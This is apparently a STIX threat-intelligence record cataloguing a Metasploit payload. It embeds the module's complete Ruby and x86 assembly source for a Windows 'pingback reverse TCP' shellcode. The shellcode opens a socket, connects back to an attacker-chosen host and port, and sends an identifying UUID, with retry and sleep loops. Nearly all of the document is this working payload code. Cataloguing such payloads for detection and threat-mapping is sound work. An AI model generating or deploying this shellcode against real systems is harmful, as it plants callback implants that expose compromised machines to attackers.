{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4434bb41-8ee4-4acb-adc1-b45734ed6f09",
    "created": "2024-08-14T16:33:19.370023Z",
    "modified": "2024-08-14T16:33:19.370027Z",
    "name": "Windows x86 Pingback, Reverse TCP Inline",
    "description": "Connect back to attacker and report UUID (Windows x86)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/pingback_reverse_tcp.rb",
            "external_id": "pingback_reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 307\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n  include Msf::Payload::Pingback\n  include Msf::Payload::Windows::BlockApi\n  include Msf::Payload::Pingback::Options\n  include Msf::Payload::Windows::Exitfunk\n\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Windows x86 Pingback, Reverse TCP Inline',\n        'Description' => 'Connect back to attacker and report UUID (Windows x86)',\n        'Author' => [ 'bwatters-r7' ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Handler' => Msf::Handler::ReverseTcp,\n        'Session' => Msf::Sessions::Pingback\n      )\n    )\n\n    def required_space\n      # Start with our cached default generated size\n      space = cached_size\n\n      # EXITFUNK 'seh' is the worst case, that adds 15 bytes\n      space += 15\n\n      space\n    end\n\n    def generate(_opts = {})\n      encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')\n      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack1('V')\n      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max\n      pingback_count = datastore['PingbackRetries']\n      pingback_sleep = datastore['PingbackSleep']\n      self.pingback_uuid ||= generate_pingback_uuid\n      uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')\n      conf = { exitfunk: datastore['EXITFUNC'] }\n\n      asm = %^\n        cld                    ; Clear the direction flag.\n        call start             ; Call start, this pushes the address of 'api_call' onto the stack.\n        #{asm_block_api}\n        start:\n          pop ebp\n        ; Input: EBP must be the address of 'api_call'.\n        ; Output: EDI will be the socket for the connection to the server\n        ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)\n        reverse_tcp:\n          push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.\n          push 'ws2_'             ; ...\n          push esp                ; Push a pointer to the \"ws2_32\" string on the stack.\n          push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}\n          mov eax, ebp\n          call eax                ; LoadLibraryA( \"ws2_32\" )\n\n          mov eax, 0x0190         ; EAX = sizeof( struct WSAData )\n          sub esp, eax            ; alloc some space for the WSAData structure\n          push esp                ; push a pointer to this stuct\n          push eax                ; push the wVersionRequested parameter\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}\n          call ebp                ; WSAStartup( 0x0190, &WSAData );\n\n        set_address:\n          push #{pingback_count}     ; retry counter\n          push #{retry_count}     ; retry counter\n          push #{encoded_host}    ; host in little-endian format\n          push #{encoded_port}    ; family AF_INET and port number\n          mov esi, esp            ; save pointer to sockaddr struct\n\n        create_socket:\n          push eax                ; if we succeed, eax will be zero, push zero for the flags param.\n          push eax                ; push null for reserved parameter\n          push eax                ; we do not specify a WSAPROTOCOL_INFO structure\n          push eax                ; we do not specify a protocol\n          inc eax                 ;\n          push eax                ; push SOCK_STREAM\n          inc eax                 ;\n          push eax                ; push AF_INET\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}\n          call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );\n          xchg edi, eax           ; save the socket for later, don't care about the value of eax after this\n\n        try_connect:\n          push 16                 ; length of the sockaddr struct\n          push esi                ; pointer to the sockaddr struct\n          push edi                ; the socket\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}\n          call ebp                ; connect( s, &sockaddr, 16 );\n\n          test eax,eax            ; non-zero means a failure\n          jz connected\n\n        handle_connect_failure:\n          ; decrement our attempt count and try again\n          dec dword [esi+8]\n          jnz try_connect\n        failure:\n          call exitfunk\n          ; this  lable is required so that reconnect attempts include\n          ; the UUID stuff if required.\n        connected:\n        send_pingback:\n          push 0                 ; flags\n          push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID\n          call get_pingback_address  ; put pingback_uuid buffer on the stack\n          db #{uuid_as_db}  ; PINGBACK_UUID\n        get_pingback_address:\n          push edi               ; saved socket\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}\n          call ebp               ; call send\n\n        cleanup_socket:\n          ; clear up the socket\n          push edi                ; socket handle\n          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}\n          call ebp                ; closesocket(socket)\n        ^\n      if pingback_count > 0\n        asm << %^\n          mov eax, [esi+12]\n          test eax, eax               ; pingback counter\n          jz exitfunk\n          dec [esi+12]\n          sleep:\n            push #{(pingback_sleep * 1000)}\n            push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}\n            call ebp                  ;sleep(pingback_sleep * 1000)\n            jmp create_socket\n        ^\n      end\n      asm << %(\n          ; restore the stack back to the connection retry count\n          dec [esi+8]               ; decrement the retry counter\n          jmp exitfunk\n          ; try again\n          jnz create_socket\n          jmp failure\n      )\n      if conf[:exitfunk]\n        asm << asm_exitfunk(conf)\n      end\n      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}